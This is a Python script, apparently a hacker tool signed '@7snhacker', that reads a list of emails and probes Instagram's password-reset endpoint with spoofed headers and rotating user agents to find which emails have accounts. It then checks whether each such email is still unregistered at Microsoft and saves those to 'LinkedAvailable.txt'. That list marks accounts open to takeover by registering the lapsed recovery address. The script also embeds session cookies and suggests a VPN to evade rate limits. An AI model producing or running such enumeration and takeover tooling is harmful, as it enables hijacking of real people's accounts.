import requests
import time
from user_agent import *

lst = open("email.txt","r")
print("""
    ███████╗███╗   ███╗ █████╗ ██╗██╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
    ██╔════╝████╗ ████║██╔══██╗██║██║     ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
    █████╗  ██╔████╔██║███████║██║██║     ██║     ███████║█████╗  ██║     █████╔╝ 
    ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
    ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
    ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
by @7snhacker""")
print("instagram version ")
sleep = float(input("sleep : "))
while True:
    email = lst.readline().split('\n')[0]
    time.sleep(sleep)
    cookies = {
        'csrftoken': 'N0OhtvjH5NalRFDyvAfQJh',
        'datr': 'qGxTaO4VHmoPwp8G1FYTtpo4',
        'ig_did': '4583D150-E69A-4701-935F-69A76A6D4C64',
        'mid': 'aFNsqAALAAFfgURcNl6iYRMdMeiC',
        'ig_nrcb': '1',
        'ps_l': '1',
        'ps_n': '1',
        'wd': '1126x919',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'priority': 'u=1, i',
        'referer': 'https://www.instagram.com/accounts/password/reset/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-full-version-list': '"Google Chrome";v="137.0.7151.120", "Chromium";v="137.0.7151.120", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': f'{generate_user_agent()}',
        'x-asbd-id': '359341',
        'x-csrftoken': 'N0OhtvjH5NalRFDyvAfQJh',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1024107428',
        'x-requested-with': 'XMLHttpRequest',
        'x-web-session-id': '462kv4:jk50ft:7jgqx8'
    }

    data = {
        'email_or_username': f'{email}',
        'jazoest': '21942',
    }

    response = requests.post(
        'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
    print(response)
    if '"We sent an email to' in response:
        print(f"Linked instagram : {email}")
        cookies = {
            'MUID': 'f768f0a9d71a47058deef47149cf691d',
            'mkt': 'en-US',
            '_pxvid': '387b5fe0-4ef8-11f0-baa7-ad0d60f7fa91',
            'MSFPC': 'GUID=17d02f066f0449a2b73597042bbff98c&HASH=17d0&LV=202504&V=4&LU=1744202961624',
            'mkt1': 'en-US',
            'amsc': 'rgLkzt7J7ly9nkHGg6O7WefQDQFfFZmbZJgDiy0uuGJV8AOhVjA7g9H8/6ANTG7kkGhl+r2z9qazvFEJUNDZvqsMHytlDDFP7VMu/C+6teNn9Me5O0RlgL5OqqBe35oU4UyNLVmrC6WdcLm+FQgC36Ck3VQ/hnQg0LM3WHGYHyQmYLnA6NS1K0HmHI1FuSFVXg/HcaQPm45kbfexwIWt9c/rAUu0AjAQpGloJFeiKQgZAs65mGfCvN/qcUnmCqGedX+GgLnCkJRMeXEwvcx1xWH1TlQmulL67+2gxY9eDFpPgJc8VnBtUP3pL3uGMwcH:2:3c',
            'fptctx2': 'taBcrIH61PuCVH7eNCyH0I1otfYAPn9VOPY9aMX8tO3k3ecRPU%252fEniICvNC0stL5RfgqQc2MJzffXpGPyMoteq0x4AJ3nU%252fnHVK03udcgd%252bpof%252b1H9sMQVyGXIfrvWh9ktrtAQhkmCuBDPN9WOVUjfGoOgXK8KjzgUk98q4sEiNEphJr3Ng%252bGDruXRbzgrEANOg3%252b3rpFZze0p%252f%252fnt2tkgWukqLSyf3BmL3luobm%252b8ueZcZqIVXCfN4JBlgPRhEue9Iu8KicgtBW0bzilvir4Ni9L7s%252fuFBfg8QMvGKoyPOUyfm5qPM3DLLi%252fTibwAeYkAGO0joqyFhgpJPkmyBZ2Q%253d%253d',
            'ai_session': 'sw+Qt2N/o0AeH+bq866xxl|1750730005893|1750730032360',
            '_px3': '314fb0128cb9c781b9aba89b3c8b393ca92e86076b4f5fabc86300ff43c32ccc:xnAtkWL2DobtBM/3Gj0v9lIiHKH2YiQADOQBSEaLhEHlg2RtJbHeYidtO50QYmQCMOg0zxmUagWsD1kSXnyHVw==:1000:BXi2yOn86s5JuG1JLzr3SONQBErCpzv/P8XELjKrWZP7Ulxi1y5KOMB7Q/JbKKTN5v932sleJPK2iJGo0g910J97wJYNEQPUi++xsootwsUmctdMNNWlnwfmnE++ZcbGM59o01X16aBorouoj5GmEJjUEwGqbx79C4mLFS517VuFE4N/GpkCd3ZE1JBJLEQFvaF3Zo5ZwgIhLpLZhH14AViDta4ERet5TxcO7jeVfoU=',
            '_pxde': '76630ecb267458b41d4e7dac9181be7877c0569cae88f1f703b02dd3bb17b4d7:eyJ0aW1lc3RhbXAiOjE3NTA3MzAwMzM3ODAsImZfa2IiOjAsImluY19pZCI6WyJiZjYzZDAxZDg2YzNjNmQ0YTI0YjBmZjgxZWU2MDZlNCJdfQ==',
        }

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=utf-8',
            'Origin': 'https://signup.live.com',
            'Referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'canary': '8FOXN/BoKJoAse9L/cxWgCzIU3wyLo0EnBVrSTmhEQuF3KXW7iSlS0uWIzhy1rsVml1o895MgruB839QaMX1R4SUT8pgeEq92aMk/ej1u4JuFZU+PMM01pI0ZURsQgTvZzDLSvhlGhdGxQtcNm3isYbVaaPERr3Kqhz22ws6CVEh2sKtDcKskRZxqKD5yoqkB+d8pAYm2vMvhhN1ST1YLXODgqQUq0/pcoVSX3kLxhHV7LLga927SGS6OOjkGrji:2:3c',
            'client-request-id': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'correlationId': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgact': '0',
            'hpgid': '200225',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        json_data = {
            'includeSuggestions': True,
            'signInName': f'{email}',
            'uiflvr': 1001,
            'scid': 100118,
            'uaid': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgid': 200225,
        }

        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
        print(response)
        if '"isAvailable":true' in response:
            print(f"Available email : {email}")
            with open("LinkedAvailable.txt", "a") as LinkedAvailable:
                LinkedAvailable.write(email + "\n")
        elif '"isAvailable":false' in response:
            print(f"NotAvailable email : {email}")
            with open("LinkedTaken.txt", "a") as Linked:
                Linked.write(email + "\n")
        else:
            print(f"Unknown email : {email}")
            with open("LinkedUnknown.txt", "a") as LinkedUnknown:
                LinkedUnknown.write(email + "\n")



    elif '"No users found"' in response:
        print(f"UnLinked instagram : {email}")
        cookies = {
            'MUID': 'f768f0a9d71a47058deef47149cf691d',
            'mkt': 'en-US',
            '_pxvid': '387b5fe0-4ef8-11f0-baa7-ad0d60f7fa91',
            'MSFPC': 'GUID=17d02f066f0449a2b73597042bbff98c&HASH=17d0&LV=202504&V=4&LU=1744202961624',
            'mkt1': 'en-US',
            'amsc': 'rgLkzt7J7ly9nkHGg6O7WefQDQFfFZmbZJgDiy0uuGJV8AOhVjA7g9H8/6ANTG7kkGhl+r2z9qazvFEJUNDZvqsMHytlDDFP7VMu/C+6teNn9Me5O0RlgL5OqqBe35oU4UyNLVmrC6WdcLm+FQgC36Ck3VQ/hnQg0LM3WHGYHyQmYLnA6NS1K0HmHI1FuSFVXg/HcaQPm45kbfexwIWt9c/rAUu0AjAQpGloJFeiKQgZAs65mGfCvN/qcUnmCqGedX+GgLnCkJRMeXEwvcx1xWH1TlQmulL67+2gxY9eDFpPgJc8VnBtUP3pL3uGMwcH:2:3c',
            'fptctx2': 'taBcrIH61PuCVH7eNCyH0I1otfYAPn9VOPY9aMX8tO3k3ecRPU%252fEniICvNC0stL5RfgqQc2MJzffXpGPyMoteq0x4AJ3nU%252fnHVK03udcgd%252bpof%252b1H9sMQVyGXIfrvWh9ktrtAQhkmCuBDPN9WOVUjfGoOgXK8KjzgUk98q4sEiNEphJr3Ng%252bGDruXRbzgrEANOg3%252b3rpFZze0p%252f%252fnt2tkgWukqLSyf3BmL3luobm%252b8ueZcZqIVXCfN4JBlgPRhEue9Iu8KicgtBW0bzilvir4Ni9L7s%252fuFBfg8QMvGKoyPOUyfm5qPM3DLLi%252fTibwAeYkAGO0joqyFhgpJPkmyBZ2Q%253d%253d',
            'ai_session': 'sw+Qt2N/o0AeH+bq866xxl|1750730005893|1750730032360',
            '_px3': '314fb0128cb9c781b9aba89b3c8b393ca92e86076b4f5fabc86300ff43c32ccc:xnAtkWL2DobtBM/3Gj0v9lIiHKH2YiQADOQBSEaLhEHlg2RtJbHeYidtO50QYmQCMOg0zxmUagWsD1kSXnyHVw==:1000:BXi2yOn86s5JuG1JLzr3SONQBErCpzv/P8XELjKrWZP7Ulxi1y5KOMB7Q/JbKKTN5v932sleJPK2iJGo0g910J97wJYNEQPUi++xsootwsUmctdMNNWlnwfmnE++ZcbGM59o01X16aBorouoj5GmEJjUEwGqbx79C4mLFS517VuFE4N/GpkCd3ZE1JBJLEQFvaF3Zo5ZwgIhLpLZhH14AViDta4ERet5TxcO7jeVfoU=',
            '_pxde': '76630ecb267458b41d4e7dac9181be7877c0569cae88f1f703b02dd3bb17b4d7:eyJ0aW1lc3RhbXAiOjE3NTA3MzAwMzM3ODAsImZfa2IiOjAsImluY19pZCI6WyJiZjYzZDAxZDg2YzNjNmQ0YTI0YjBmZjgxZWU2MDZlNCJdfQ==',
        }

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=utf-8',
            'Origin': 'https://signup.live.com',
            'Referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'canary': '8FOXN/BoKJoAse9L/cxWgCzIU3wyLo0EnBVrSTmhEQuF3KXW7iSlS0uWIzhy1rsVml1o895MgruB839QaMX1R4SUT8pgeEq92aMk/ej1u4JuFZU+PMM01pI0ZURsQgTvZzDLSvhlGhdGxQtcNm3isYbVaaPERr3Kqhz22ws6CVEh2sKtDcKskRZxqKD5yoqkB+d8pAYm2vMvhhN1ST1YLXODgqQUq0/pcoVSX3kLxhHV7LLga927SGS6OOjkGrji:2:3c',
            'client-request-id': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'correlationId': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgact': '0',
            'hpgid': '200225',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        json_data = {
            'includeSuggestions': True,
            'signInName': f'{email}',
            'uiflvr': 1001,
            'scid': 100118,
            'uaid': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgid': 200225,
        }

        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
        print(response)
        if '"isAvailable":true' in response:
            print(f"Available email : {email}")
        elif '"isAvailable":false' in response:
            print(f"NotAvailable email : {email}")
        else:
            print(f"Unknown email : {email}")
    elif '"Please wait a few minutes before you try again."' in response:
        print(f"Unknown instagram Your get block please turn on vpn or try again later : {email}")
        cookies = {
            'MUID': 'f768f0a9d71a47058deef47149cf691d',
            'mkt': 'en-US',
            '_pxvid': '387b5fe0-4ef8-11f0-baa7-ad0d60f7fa91',
            'MSFPC': 'GUID=17d02f066f0449a2b73597042bbff98c&HASH=17d0&LV=202504&V=4&LU=1744202961624',
            'mkt1': 'en-US',
            'amsc': 'rgLkzt7J7ly9nkHGg6O7WefQDQFfFZmbZJgDiy0uuGJV8AOhVjA7g9H8/6ANTG7kkGhl+r2z9qazvFEJUNDZvqsMHytlDDFP7VMu/C+6teNn9Me5O0RlgL5OqqBe35oU4UyNLVmrC6WdcLm+FQgC36Ck3VQ/hnQg0LM3WHGYHyQmYLnA6NS1K0HmHI1FuSFVXg/HcaQPm45kbfexwIWt9c/rAUu0AjAQpGloJFeiKQgZAs65mGfCvN/qcUnmCqGedX+GgLnCkJRMeXEwvcx1xWH1TlQmulL67+2gxY9eDFpPgJc8VnBtUP3pL3uGMwcH:2:3c',
            'fptctx2': 'taBcrIH61PuCVH7eNCyH0I1otfYAPn9VOPY9aMX8tO3k3ecRPU%252fEniICvNC0stL5RfgqQc2MJzffXpGPyMoteq0x4AJ3nU%252fnHVK03udcgd%252bpof%252b1H9sMQVyGXIfrvWh9ktrtAQhkmCuBDPN9WOVUjfGoOgXK8KjzgUk98q4sEiNEphJr3Ng%252bGDruXRbzgrEANOg3%252b3rpFZze0p%252f%252fnt2tkgWukqLSyf3BmL3luobm%252b8ueZcZqIVXCfN4JBlgPRhEue9Iu8KicgtBW0bzilvir4Ni9L7s%252fuFBfg8QMvGKoyPOUyfm5qPM3DLLi%252fTibwAeYkAGO0joqyFhgpJPkmyBZ2Q%253d%253d',
            'ai_session': 'sw+Qt2N/o0AeH+bq866xxl|1750730005893|1750730032360',
            '_px3': '314fb0128cb9c781b9aba89b3c8b393ca92e86076b4f5fabc86300ff43c32ccc:xnAtkWL2DobtBM/3Gj0v9lIiHKH2YiQADOQBSEaLhEHlg2RtJbHeYidtO50QYmQCMOg0zxmUagWsD1kSXnyHVw==:1000:BXi2yOn86s5JuG1JLzr3SONQBErCpzv/P8XELjKrWZP7Ulxi1y5KOMB7Q/JbKKTN5v932sleJPK2iJGo0g910J97wJYNEQPUi++xsootwsUmctdMNNWlnwfmnE++ZcbGM59o01X16aBorouoj5GmEJjUEwGqbx79C4mLFS517VuFE4N/GpkCd3ZE1JBJLEQFvaF3Zo5ZwgIhLpLZhH14AViDta4ERet5TxcO7jeVfoU=',
            '_pxde': '76630ecb267458b41d4e7dac9181be7877c0569cae88f1f703b02dd3bb17b4d7:eyJ0aW1lc3RhbXAiOjE3NTA3MzAwMzM3ODAsImZfa2IiOjAsImluY19pZCI6WyJiZjYzZDAxZDg2YzNjNmQ0YTI0YjBmZjgxZWU2MDZlNCJdfQ==',
        }

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=utf-8',
            'Origin': 'https://signup.live.com',
            'Referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'canary': '8FOXN/BoKJoAse9L/cxWgCzIU3wyLo0EnBVrSTmhEQuF3KXW7iSlS0uWIzhy1rsVml1o895MgruB839QaMX1R4SUT8pgeEq92aMk/ej1u4JuFZU+PMM01pI0ZURsQgTvZzDLSvhlGhdGxQtcNm3isYbVaaPERr3Kqhz22ws6CVEh2sKtDcKskRZxqKD5yoqkB+d8pAYm2vMvhhN1ST1YLXODgqQUq0/pcoVSX3kLxhHV7LLga927SGS6OOjkGrji:2:3c',
            'client-request-id': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'correlationId': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgact': '0',
            'hpgid': '200225',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        json_data = {
            'includeSuggestions': True,
            'signInName': f'{email}',
            'uiflvr': 1001,
            'scid': 100118,
            'uaid': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgid': 200225,
        }

        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
        print(response)
        if '"isAvailable":true' in response:
            print(f"Available email : {email}")
        elif '"isAvailable":false' in response:
            print(f"NotAvailable email : {email}")
        else:
            print(f"Unknown email : {email}")

    else:
        print(f"Error instagram : {email}")
        cookies = {
            'MUID': 'f768f0a9d71a47058deef47149cf691d',
            'mkt': 'en-US',
            '_pxvid': '387b5fe0-4ef8-11f0-baa7-ad0d60f7fa91',
            'MSFPC': 'GUID=17d02f066f0449a2b73597042bbff98c&HASH=17d0&LV=202504&V=4&LU=1744202961624',
            'mkt1': 'en-US',
            'amsc': 'rgLkzt7J7ly9nkHGg6O7WefQDQFfFZmbZJgDiy0uuGJV8AOhVjA7g9H8/6ANTG7kkGhl+r2z9qazvFEJUNDZvqsMHytlDDFP7VMu/C+6teNn9Me5O0RlgL5OqqBe35oU4UyNLVmrC6WdcLm+FQgC36Ck3VQ/hnQg0LM3WHGYHyQmYLnA6NS1K0HmHI1FuSFVXg/HcaQPm45kbfexwIWt9c/rAUu0AjAQpGloJFeiKQgZAs65mGfCvN/qcUnmCqGedX+GgLnCkJRMeXEwvcx1xWH1TlQmulL67+2gxY9eDFpPgJc8VnBtUP3pL3uGMwcH:2:3c',
            'fptctx2': 'taBcrIH61PuCVH7eNCyH0I1otfYAPn9VOPY9aMX8tO3k3ecRPU%252fEniICvNC0stL5RfgqQc2MJzffXpGPyMoteq0x4AJ3nU%252fnHVK03udcgd%252bpof%252b1H9sMQVyGXIfrvWh9ktrtAQhkmCuBDPN9WOVUjfGoOgXK8KjzgUk98q4sEiNEphJr3Ng%252bGDruXRbzgrEANOg3%252b3rpFZze0p%252f%252fnt2tkgWukqLSyf3BmL3luobm%252b8ueZcZqIVXCfN4JBlgPRhEue9Iu8KicgtBW0bzilvir4Ni9L7s%252fuFBfg8QMvGKoyPOUyfm5qPM3DLLi%252fTibwAeYkAGO0joqyFhgpJPkmyBZ2Q%253d%253d',
            'ai_session': 'sw+Qt2N/o0AeH+bq866xxl|1750730005893|1750730032360',
            '_px3': '314fb0128cb9c781b9aba89b3c8b393ca92e86076b4f5fabc86300ff43c32ccc:xnAtkWL2DobtBM/3Gj0v9lIiHKH2YiQADOQBSEaLhEHlg2RtJbHeYidtO50QYmQCMOg0zxmUagWsD1kSXnyHVw==:1000:BXi2yOn86s5JuG1JLzr3SONQBErCpzv/P8XELjKrWZP7Ulxi1y5KOMB7Q/JbKKTN5v932sleJPK2iJGo0g910J97wJYNEQPUi++xsootwsUmctdMNNWlnwfmnE++ZcbGM59o01X16aBorouoj5GmEJjUEwGqbx79C4mLFS517VuFE4N/GpkCd3ZE1JBJLEQFvaF3Zo5ZwgIhLpLZhH14AViDta4ERet5TxcO7jeVfoU=',
            '_pxde': '76630ecb267458b41d4e7dac9181be7877c0569cae88f1f703b02dd3bb17b4d7:eyJ0aW1lc3RhbXAiOjE3NTA3MzAwMzM3ODAsImZfa2IiOjAsImluY19pZCI6WyJiZjYzZDAxZDg2YzNjNmQ0YTI0YjBmZjgxZWU2MDZlNCJdfQ==',
        }

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=utf-8',
            'Origin': 'https://signup.live.com',
            'Referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'canary': '8FOXN/BoKJoAse9L/cxWgCzIU3wyLo0EnBVrSTmhEQuF3KXW7iSlS0uWIzhy1rsVml1o895MgruB839QaMX1R4SUT8pgeEq92aMk/ej1u4JuFZU+PMM01pI0ZURsQgTvZzDLSvhlGhdGxQtcNm3isYbVaaPERr3Kqhz22ws6CVEh2sKtDcKskRZxqKD5yoqkB+d8pAYm2vMvhhN1ST1YLXODgqQUq0/pcoVSX3kLxhHV7LLga927SGS6OOjkGrji:2:3c',
            'client-request-id': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'correlationId': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgact': '0',
            'hpgid': '200225',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        json_data = {
            'includeSuggestions': True,
            'signInName': f'{email}',
            'uiflvr': 1001,
            'scid': 100118,
            'uaid': '1bfcf3d86a676cf18caac2c61f4dcecf',
            'hpgid': 200225,
        }

        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26opid%3dFE382B0FB1E3E57F%26opidt%3d1750730031%26uaid%3d1bfcf3d86a676cf18caac2c61f4dcecf%26contextid%3dA0049481BAA4CFA2%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=1bfcf3d86a676cf18caac2c61f4dcecf&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
        print(response)
        if '"isAvailable":true' in response:
            print(f"Available email : {email}")
        elif '"isAvailable":false' in response:
            print(f"NotAvailable email : {email}")
        else:
            print(f"Unknown email : {email}")

